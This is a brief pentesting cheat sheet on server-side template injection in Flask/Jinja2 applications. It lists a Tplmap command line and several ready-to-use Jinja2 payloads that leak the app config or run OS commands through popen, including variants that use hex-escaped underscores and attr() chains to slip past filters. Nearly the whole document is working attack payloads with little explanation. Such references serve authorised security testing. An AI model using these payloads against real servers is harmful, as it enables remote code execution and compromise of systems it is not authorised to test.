---
title: Server-Side Template Injection
desc: 
tags: [Flask, Injection, Jinja, Python, Server, Template, Web]
alts: []
render_with_liquid: true
---

{% raw %}

## 1. Automation

1. **Use Tplmap**

    **[Tplmap](https://github.com/epinna/tplmap){:target="_blank"}** is a program for Server-Side Template Injection and Code Injection.

    ```sh
    ./tplmap.py -u http://vulnerable.com/?name=test
    ```

<br />

## 2. Manual Injection

1. **Flask Jinja2**

    Flask is a micro web framework written in Python.

    1. **Basic**

        ```
        {{ 4*2 }}
        {{ config.items() }}
        ```

    2. **OS Command Injection**

        ```
        {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

        {{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}

        {{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

        {{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}

        {{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
        ```

{% endraw %}